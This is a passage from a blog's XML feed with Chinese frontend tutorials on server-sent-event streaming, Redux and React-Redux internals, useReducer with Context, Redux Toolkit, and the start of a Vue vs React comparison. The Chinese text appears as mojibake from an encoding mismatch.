      <link href="/2024/11/06/%E6%B5%81%E5%BC%8F%E6%B8%B2%E6%9F%93/"/>
      <url>/2024/11/06/%E6%B5%81%E5%BC%8F%E6%B8%B2%E6%9F%93/</url>
      <content type="html"><![CDATA[<blockquote><p>è¯·æ±‚chatgptæ¥å£ï¼Œä¼šæœ‰ä¸€ä¸ª<code>stream: boolean</code>çš„å‚æ•°ï¼Œè¡¨ç¤ºæ¥å£æ”¯æŒæµå¼æ¸²æŸ“ã€‚å¦‚ä½•å®ç°æµå¼æ¸²æŸ“å‘¢ï¼Ÿ</p></blockquote><p><code>EventSource</code>æ¥å£æ˜¯ web å†…å®¹ä¸æœåŠ¡å™¨å‘é€äº‹ä»¶é€šä¿¡çš„æ¥å£ã€‚<br>ä¸€ä¸ª EventSource å®ä¾‹ä¼šå¯¹ HTTP æœåŠ¡å™¨å¼€å¯ä¸€ä¸ªæŒä¹…åŒ–çš„è¿æ¥ï¼Œä»¥ <code>text/event-stream</code> æ ¼å¼å‘é€äº‹ä»¶ï¼Œæ­¤è¿æ¥ä¼šä¸€ç›´ä¿æŒå¼€å¯ç›´åˆ°é€šè¿‡è°ƒç”¨ <code>EventSource.close() å…³é—­ã€‚</code></p><p>è¯·æ±‚typeä¸º<code>eventsource</code>(ä¸æ˜¯æ™®é€šçš„xhr)ï¼Œæ§åˆ¶å°é‡Œç‚¹å‡»è¯·æ±‚ï¼Œä¼šæœ‰ä¸€ä¸ªEventStreamäº‹ä»¶æµï¼Œå®ƒä¼šä¸€ç‚¹ç‚¹æŠŠæ¶ˆæ¯æ¨é€ç»™å‰ç«¯ã€‚</p><ul><li>å‰ç«¯ï¼šä½¿ç”¨eventsource APIå‘è¯·æ±‚</li><li>åç«¯Content-Type: text/event-stream</li><li>æ¶ˆæ¯æ ¼å¼: â€œdata: xxx\n\nâ€</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> evtSource = <span class="keyword">new</span> EventSource(<span class="string">"sse.php"</span>);</span><br><span class="line"></span><br><span class="line">evtSource.onmessage = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>å‰ç«¯npmåŒ…ï¼š@microsoft/fetch-event-source<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; fetchEventSource &#125; <span class="keyword">from</span> <span class="string">'@microsoft/fetch-event-source'</span>;</span><br><span class="line"></span><br><span class="line">fetchEventSource(<span class="string">`/api/v2/chat/<span class="subst">$&#123;key&#125;</span>`</span>, &#123;</span><br><span class="line">  method: <span class="string">'POST'</span>,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  body: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">    messages: [],</span><br><span class="line">    agent_name: botItem.botName,</span><br><span class="line">    stream: <span class="literal">true</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">  openWhenHidden: <span class="literal">true</span>,</span><br><span class="line">  onerror(err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'å‡ºé”™å•¦ï¼š'</span> + err);</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;,</span><br><span class="line">  onmessage(res) &#123;&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” Redux + React-Redux å·¥ä½œåŸç†</title>
      <link href="/2024/10/25/Redux/"/>
      <url>/2024/10/25/Redux/</url>
      <content type="html"><![CDATA[<blockquote><p>æ›¾å‡ ä½•æ—¶ï¼ŒRedux ä½œä¸º React å…¨å®¶æ¡¶çš„å›ºå®šæˆå‘˜ï¼Œå‡ ä¹æ˜¯é¢è¯•å¿…è€ƒé¢˜ã€‚Redux åšäº†ä»€ä¹ˆï¼Ÿè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼ŸåŸç†æ˜¯å•¥ï¼ŸHookså‡ºæ¥ä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å®ƒå—ï¼Ÿ</p></blockquote><h3 id="1-é€‚ç”¨åœºæ™¯"><a href="#1-é€‚ç”¨åœºæ™¯" class="headerlink" title="1. é€‚ç”¨åœºæ™¯"></a>1. é€‚ç”¨åœºæ™¯</h3><p>å½“ä¸€ä»½æ•°æ®éœ€è¦å…¨å±€å…±äº«æ—¶ï¼Œå¦‚æœä¸ä½¿ç”¨ Redux çŠ¶æ€ç®¡ç†å·¥å…·ï¼Œä¸æŒ‰ç…§ä¸€å®šè§„å¾‹å¤„ç†çŠ¶æ€çš„è¯»å†™ï¼Œä½ çš„ä»£ç å¾ˆå¿«å°±ä¼šå˜æˆä¸€å›¢ä¹±éº»ã€‚<br>è¿™ä¸ªæ—¶å€™ä½ éœ€è¦ä¸€ç§æœºåˆ¶ï¼Œå¯ä»¥åœ¨å…¨å±€åŒä¸€ä¸ªåœ°æ–¹æŸ¥è¯¢çŠ¶æ€ã€æ”¹å˜çŠ¶æ€ã€ä¼ æ’­çŠ¶æ€çš„å˜åŒ–ã€‚<br><em>Redux</em> å°±æ˜¯è¿™ä¸ªæœºåˆ¶ã€‚</p><p><br></p><h3 id="2-Reduxæ˜¯æ€ä¹ˆåšçš„ï¼Ÿ"><a href="#2-Reduxæ˜¯æ€ä¹ˆåšçš„ï¼Ÿ" class="headerlink" title="2. Reduxæ˜¯æ€ä¹ˆåšçš„ï¼Ÿ"></a>2. Reduxæ˜¯æ€ä¹ˆåšçš„ï¼Ÿ</h3><p>é¦–å…ˆï¼Œæ‰€æœ‰çš„çŠ¶æ€ï¼Œéƒ½ä¿å­˜åœ¨ä¸€ä¸ªå¯¹è±¡é‡Œã€‚</p><ul><li><em><code>store</code></em>ï¼šä¿å­˜æ•°æ®çš„åœ°æ–¹</li><li><em><code>state</code></em>: æ˜¯storeå½“å‰æ—¶åˆ»çš„å¿«ç…§ï¼Œå¯ä»¥é€šè¿‡<code>store.getState()</code>è·å¾—</li><li><em><code>action</code></em>: è¡¨ç¤ºå½“å‰è¦æ‰§è¡Œçš„æ“ä½œï¼Œæ˜¯ä¸€ä¸ªå¯¹è±¡ <code>const action = { type: &#39;ADD_TODO&#39;ï¼Œ payload: 1 }</code></li><li><em><code>dispatch</code></em>: æ˜¯å‘å‡ºActionçš„å”¯ä¸€åŠæ³•</li><li><em><code>reduer</code></em>: storeæ”¶åˆ°actionåï¼Œå¿…é¡»ç»™å‡ºä¸€ä¸ªå…¨æ–°çš„stateï¼Œè¿™æ ·viewæ‰å‘ç”Ÿå˜åŒ–ã€‚è¿™ç§stateçš„è®¡ç®—è¿‡ç¨‹å°±å«reducerã€‚<br>Reducer å‡½æ•°æœ€é‡è¦çš„ç‰¹å¾æ˜¯ï¼Œå®ƒæ˜¯ä¸€ä¸ªçº¯å‡½æ•°ã€‚åªè¦æ˜¯åŒæ ·çš„è¾“å…¥ï¼Œå¿…å®šå¾—åˆ°åŒæ ·çš„è¾“å‡ºã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¿…é¡»æ˜¯å…¨æ–°çš„å¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;, state, &#123; thingToChange &#125;);</span><br><span class="line">  <span class="comment">// æˆ–è€…</span></span><br><span class="line">  <span class="keyword">return</span> &#123; ...state, ...newState &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><!-- - *`subscribe`*: Store å…è®¸ä½¿ç”¨store.subscribeæ–¹æ³•è®¾ç½®ç›‘å¬å‡½æ•°ï¼Œä¸€æ—¦ State å‘ç”Ÿå˜åŒ–ï¼Œå°±è‡ªåŠ¨æ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚ --><p><br></p><p><em>æ•´ä¸ªæµç¨‹å¦‚ä¸‹ï¼š</em><br>è®©ç”¨æˆ·å‘å‡ºactionï¼ŒReducerå‡½æ•°ç®—å‡ºæ–°çš„State, Viewé‡æ–°æ¸²æŸ“ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultState = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">state = defaultState, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'ADD'</span>:</span><br><span class="line">      <span class="keyword">return</span> state + action.payload;</span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// store.dispatchè§¦å‘reduerçš„è‡ªåŠ¨æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">const</span> state = reducer(<span class="number">1</span>, &#123;</span><br><span class="line">  type: <span class="string">'ADD'</span>,</span><br><span class="line">  payload: <span class="number">2</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-å®ç°ä¸€ä¸ªRedux"><a href="#3-å®ç°ä¸€ä¸ªRedux" class="headerlink" title="3. å®ç°ä¸€ä¸ªRedux"></a>3. å®ç°ä¸€ä¸ªRedux</h3><p>æˆ‘ä»¬æ¥å®ç°ä¸€ä¸ªRedux<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store</span></span><br><span class="line"><span class="keyword">const</span> createStore = <span class="function">(<span class="params">reducer</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> state;</span><br><span class="line">  <span class="keyword">let</span> listeners = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> getState = <span class="function"><span class="params">()</span> =&gt;</span> state;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> dispatch = <span class="function">(<span class="params">action</span>) =&gt;</span> &#123;</span><br><span class="line">    state = reducer(state, action);</span><br><span class="line">    listeners.forEach(<span class="function"><span class="params">listener</span> =&gt;</span> listener());</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> subscribe = <span class="function">(<span class="params">listener</span>) =&gt;</span> &#123;</span><br><span class="line">    listeners.push(listener);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      listeners = listeners.filter(<span class="function"><span class="params">l</span> =&gt;</span> l !== listener);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  dispatch(&#123;&#125;);</span><br><span class="line">  <span class="keyword">return</span> &#123; getState, dispatch, subscribe &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-è§†å›¾æ›´æ–°"><a href="#4-è§†å›¾æ›´æ–°" class="headerlink" title="4. è§†å›¾æ›´æ–°"></a>4. è§†å›¾æ›´æ–°</h3><p>æ•°æ®å’Œæ“ä½œæ•°æ®çš„é€»è¾‘æœ‰äº†ï¼Œå‰©ä¸‹çš„é—®é¢˜å°±æ˜¯ï¼Œè®¡ç®—å‡ºæ–°çš„stateåï¼Œæ€ä¹ˆè§¦å‘è§†å›¾æ›´æ–°ï¼Ÿ<br>è¿™æ—¶éœ€è¦ç”¨åˆ°<code>React-Redux</code>ã€‚<code>React-Redux</code>éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li>stateå¯¹è±¡å¦‚ä½•è½¬åŒ–ä¸ºç»„ä»¶çš„å‚æ•°ï¼Ÿ</li><li>ç”¨æˆ·å‘å‡ºçš„Actionå¦‚ä½•ä»UIç»„ä»¶ä¼ å‡ºå»ï¼Ÿ</li></ul><p><code>React-Redux</code>æä¾› <em><code>connect</code></em>æ–¹æ³•ï¼Œç”¨connectåŒ…è£¹ä½ çš„ç»„ä»¶æ¥åˆ›å»ºä¸€ä¸ª<em>é«˜é˜¶ç»„ä»¶</em>ï¼Œå®ƒä¼šä¼ é€’dispatchæ–¹æ³•å’ŒReduxå‚¨å­˜çš„stateï¼Œå¹¶ä½œä¸ºpropsä¼ é€’åˆ°ç»„ä»¶ä¸­ã€‚</p><ul><li><em><code>connect</code></em><br>è®©ç»„ä»¶å˜æˆèƒ½å“åº”stateå˜åŒ–çš„ç»„ä»¶ã€‚<br><code>connect</code>æ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼ŒmapStateToProps å’Œ mapDispatchToProps</li><li><em><code>mapStateToProps</code></em><br>ä¼šå°†stateæ˜ å°„åˆ°ç»„ä»¶çš„propsä¸Šã€‚å½“stateæ›´æ–°çš„æ—¶å€™ï¼Œä¼šè§¦å‘ UI ç»„ä»¶çš„é‡æ–°æ¸²æŸ“ã€‚</li><li><em><code>mapDispatchToProps</code></em><br>ä¼šreduxé‡Œçš„dispatchæ–¹æ³•ä¼ é€’åˆ°ç»„ä»¶çš„propsä¸Š</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;connect&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actions <span class="keyword">from</span> <span class="string">'../actions/actions'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;count, increment, decrement&#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;The count is &#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;() =&gt; increment(count)&#125;&gt;+&lt;/</span>button&gt;</span><br><span class="line">        &lt;button onClick=&#123;() =&gt; decrement(count)&#125;&gt;-<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const mapStateToProps = store =&gt; (&#123;</span></span><br><span class="line"><span class="regexp">  count: store.count</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const mapDispatchToProps = dispatch =&gt; (&#123;</span></span><br><span class="line"><span class="regexp">  increment: count =&gt; dispatch(actions.increment(count)),</span></span><br><span class="line"><span class="regexp">  decrement: count =&gt; dispatch(actions.decrement(count))</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default connect(mapStateToProps, mapDispatchToProps)(App);</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-useReducer-ä»£æ›¿-Redux"><a href="#5-useReducer-ä»£æ›¿-Redux" class="headerlink" title="5. useReducer ä»£æ›¿ Redux"></a>5. useReducer ä»£æ›¿ Redux</h3><p>ä½†æ˜¯ï¼Œè‡ªä»hookså‡ºæ¥ä¹‹åï¼Œæ–°ç‰ˆ React ç»“åˆreducerå’ŒContextï¼Œå°±å¯ä»¥ç›´æ¥æ›¿ä»£Reduxã€‚<br>state å­˜åœ¨äºé¡¶å±‚ç»„ä»¶ä¸­ï¼Œç”± useReducer ç®¡ç†ï¼ŒContext è¿›è¡Œåˆ†å‘ã€‚å­ç»„ä»¶å¯ä»¥è½»æ¾è·å– state å’Œ dispatchã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext, useReducer &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TasksContext = createContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TasksDispatchContext = createContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">TasksProvider</span>(<span class="params">&#123; children &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [tasks, dispatch] = useReducer(tasksReducer, initialTasks);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;TasksContext.Provider value=&#123;tasks&#125;&gt;</span><br><span class="line">      &lt;TasksDispatchContext.Provider value=&#123;dispatch&#125;&gt;</span><br><span class="line">        &#123;children&#125;</span><br><span class="line">      &lt;<span class="regexp">/TasksDispatchContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>TasksContext.Provider&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç»„ä»¶ä¸­è·å–taskå’Œdispatch</span></span><br><span class="line"><span class="keyword">const</span> dispatch = useContext(TasksDispatchContext);</span><br><span class="line"><span class="keyword">const</span> tasks = useContext(TasksContext);</span><br></pre></td></tr></table></figure></p><p>ä¹Ÿå¯ä»¥å†å°è£…ä¸€å±‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useTasks</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(TasksContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useTasksDispatch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(TasksDispatchContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> tasks = useTasks();</span><br><span class="line"><span class="keyword">const</span> dispatch = useTasksDispatch();</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-ç°åœ¨çš„Redux"><a href="#6-ç°åœ¨çš„Redux" class="headerlink" title="6. ç°åœ¨çš„Redux"></a>6. ç°åœ¨çš„Redux</h3><p>é‚£è¿˜ç”¨reduxå—ï¼Ÿæœ€æ–°ç‰ˆReduxåœ¨æä¾›ä»€ä¹ˆè§£å†³æ–¹æ¡ˆï¼Ÿæœ€æ–°åŒ…å«<code>Redux Toolkit</code><br>æˆ‘è§‰å¾—æ ¸å¿ƒä¼˜åŠ¿åªå‰©ä¸‹<em><code>createSlice</code></em>ï¼Œ è®©ä½ ä½¿ç”¨ Immer åº“ æ¥ç¼–å†™ reducerï¼Œä¸éœ€è¦ä½¿ç”¨æ‹“å±•è¿ç®—ç¬¦ï¼Œæ¶ˆé™¤æ„å¤–çš„ mutations<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createSlice &#125; <span class="keyword">from</span> <span class="string">"@reduxjs/toolkit"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> todosSlice = createSlice(&#123;</span><br><span class="line">  name: <span class="string">"todos"</span>,</span><br><span class="line">  initialState: [],</span><br><span class="line">  reducers: &#123;</span><br><span class="line">    todoAdded(state, action) &#123;</span><br><span class="line">      state.push(&#123;</span><br><span class="line">        id: action.payload.id,</span><br><span class="line">        text: action.payload.text,</span><br><span class="line">        completed: <span class="literal">false</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    todoToggled(state, action) &#123;</span><br><span class="line">      <span class="keyword">const</span> todo = state.find(<span class="function">(<span class="params">todo</span>) =&gt;</span> todo.id === action.payload);</span><br><span class="line">      todo.completed = !todo.completed;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://tech.meituan.com/2017/04/27/vuex-code-analysis.html" target="_blank" rel="noopener">Vuexæ¡†æ¶åŸç†ä¸æºç åˆ†æ</a></li><li><a href="https://www.ruanyifeng.com/blog/2016/09/redux_tutorial_part_one_basic_usages.html" target="_blank" rel="noopener">Redux å…¥é—¨æ•™ç¨‹</a></li><li><a href="https://juejin.cn/post/6844903934801215501?searchId=2025022315432084B513C608EBE9B0422F" target="_blank" rel="noopener">ã€è¯‘ã€‘ä¸è¦å†é—®æˆ‘React Hooksèƒ½å¦å–ä»£Reduxäº†</a></li><li><a href="https://react.docschina.org/learn/scaling-up-with-reducer-and-context" target="_blank" rel="noopener">ä½¿ç”¨ Reducer å’Œ Context æ‹“å±•ä½ çš„åº”ç”¨</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” Vueå’ŒReactçš„åŒºåˆ«</title>
      <link href="/2024/08/25/Vue%E5%92%8CReact%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2024/08/25/Vue%E5%92%8CReact%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      <content type="html"><![CDATA[<blockquote><p>éƒ½æ˜¯MVCæ•°æ®é©±åŠ¨çš„æ¡†æ¶ï¼ŒVueå’ŒReactçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ<br>æœ¬æ–‡ä¸€ç®©ç­æ€»ç»“Vue2, Vue3, React, React Hooksçš„ç‰¹ç‚¹å’ŒåŒºåˆ«~</p></blockquote><p><br></p><h3 id="1-Vue-å’Œ-React-çš„åŒºåˆ«"><a href="#1-Vue-å’Œ-React-çš„åŒºåˆ«" class="headerlink" title="1. Vue å’Œ React çš„åŒºåˆ«"></a>1. Vue å’Œ React çš„åŒºåˆ«</h3><p>å¯ä»¥æ€»ç»“ä¸ºè¿™å‡ ç‚¹ï¼š</p><p><strong>1. ä»£ç ç»„ç»‡æ–¹å¼ä¸åŒ</strong></p><ul><li>React å…¨JSå†™æ³•ï¼Œè‡ªæˆä¸€ä½“ã€‚React æ³¨é‡ç®€å•Simpleï¼Œæœºåˆ¶çš„ç®€å•ã€‚Reactçš„å‡½æ•°å¼ç»„ä»¶ï¼ˆFCï¼‰å°±å¾ˆ Simpleï¼ŒFC æœ¬è´¨ä¸Šå°±æ˜¯æ¯æ¬¡é‡æ–°æ¸²æŸ“çš„æ—¶å€™æŠŠæ•´ä¸ªå‡½æ•°é‡æ–°è·‘ä¸€éï¼Œè¿™æä¾›äº†å¾ˆå¤šå¯èƒ½æ€§ã€‚</li><li>Vueåˆ†ç¦»äº†<code>&lt;template&gt;</code>å’Œ<code>&lt;script&gt;</code>ï¼Œé€»è¾‘å’Œæ¨¡æ¿åˆ†ç¦»ï¼ŒåŠ ä¸Šå¤§é‡å°è£…ç¨‹åº¦æ›´é«˜çš„APIã€‚è™½ç„¶Vue3åŠ å…¥äº†æ›´çµæ´»çš„Composition APIï¼Œä½†æ˜¯å®ƒæœ¬è´¨è¿˜æ˜¯opitoné…ç½®å¼çš„å†™æ³•ã€‚</li></ul><p><br></p><p><strong>2. å“åº”å¼çš„å†™æ³•ä¸åŒ</strong></p><ul><li>Vue ç”¨ <code>state = newState</code> æ¥é€šçŸ¥å˜æ›´ï¼Œæ›´ç¬¦åˆç›´è§‰ã€‚</li></ul><p>æ›´ç¬¦åˆå¤§å®¶å¿ƒç›®ä¸­å“åº”å¼çš„å†™æ³•ã€‚ä½†æ˜¯æ— è®ºæ˜¯Vue2ä¸­ <code>this.foo = a</code>ï¼Œè¿˜æ˜¯ Vue3 ä¸­ <code>foo.value = a</code> çš„å†™æ³•ï¼Œéƒ½ä¸èƒ½å®Œå…¨è¾¾åˆ° <code>state = newState</code> çš„æ•ˆæœã€‚éƒ½æœ‰è¦é¢å¤–å¤„ç†çš„åœ°æ–¹ï¼ŒVue2ä¸­ç»™ <code>data</code> æ–°å¢å±æ€§ï¼Œæ•°ç»„æ“ä½œéœ€è¦é¢å¤–çš„APIã€‚Vue3ä¸­çš„ <code>.value</code> å†™æ³•ä¸å¤Ÿç›´è§‚ï¼Œæ‹†åˆ†äº† <code>ref</code> å’Œ <code>reactive</code> ä¸¤ç§ç±»å‹ï¼Œå“åº”å¼ä¸¢å¤±<code>toRef</code>ç­‰é—®é¢˜ä¹Ÿå¾ˆè®©äººå¾ˆå›°æƒ‘ã€‚</p><ul><li>Reactæ˜¾å¼è°ƒç”¨ <code>setState(newState)</code> æ¥é€šçŸ¥å˜æ›´ã€‚</li></ul><p>å½“ <code>state</code> æ˜¯å¤æ‚å¯¹è±¡æ—¶ï¼Œå¤åˆ¶ä¸€ä¸ªå…¨æ–°çš„å‰¯æœ¬ï¼Œä¿®æ”¹å®ƒï¼Œæ˜¯ä¸€ä»¶éº»çƒ¦çš„äº‹ã€‚ä¸è¿‡ React ä¹Ÿä¸æƒ³ç®¡è¿™ä¸ªé—®é¢˜ï¼Œå®ƒæ¨èä½ ç”¨ ImmerJS æ¥å¤„ç†ã€‚</p><p><br></p><p><strong>3. é‡ç»˜æ€§èƒ½æ¶ˆè€—ä¸åŒï¼ˆå®ç°å“åº”å¼æ–¹å¼ä¸åŒï¼‰</strong></p><p><em>InnerHTML vs Virtual Dom</em></p><ul><li>innerHTML:  render html string + é‡æ–°åˆ›å»ºæ‰€æœ‰ DOM å…ƒç´ </li><li>Virtual DOM: render Virtual DOM + diff + ç‚¹å¯¹ç‚¹çš„ DOM æ›´æ–° </li></ul><p>Virtual DOM render + diff 